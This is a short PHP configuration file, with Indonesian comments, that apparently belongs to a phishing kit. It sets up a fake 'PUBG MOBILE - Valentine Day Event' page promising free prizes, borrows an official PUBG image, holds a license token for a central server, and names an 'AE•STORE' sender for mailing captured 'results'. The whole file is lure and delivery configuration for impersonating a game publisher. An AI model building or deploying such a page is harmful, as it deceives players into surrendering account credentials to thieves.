<?php
// KONTROL UNTUK MENDAPATKAN ZONA WAKTU (JAKARTA)
date_default_timezone_set('Asia/Jakarta');
$jamasuk = date('l, d-m-Y h:i:s');

//TOKEN UNTUK MENGAKSES SERVER PUSAT (MASUKKAN TOKEN YANG DIBERIKAN OLEH ADMIN DISINI)
$License = "5efa6a8d23042";

// KONTROL UNTUK HALAMAN
$title = 'PUBG MOBILE - Valentine Day Event';
$description = 'Valentine Day has begun! Collect your favorite prizes here right now !!! This promo is free without the need for topup. Come join this event with friends all over the world now!';
$copyright = 'PUBG MOBILE';
$theme = '#000';
$image = 'https://www.pubgmobile.com/en/event/royalepass11/images/share.png';
$icon = 'img/icon.png';

// KONTROL UNTUK HALAMAN KIRIM RESULT
$author = '';
$sender = 'From: LIVE UNCHECK | AE•STORE <result@aestore>';
?>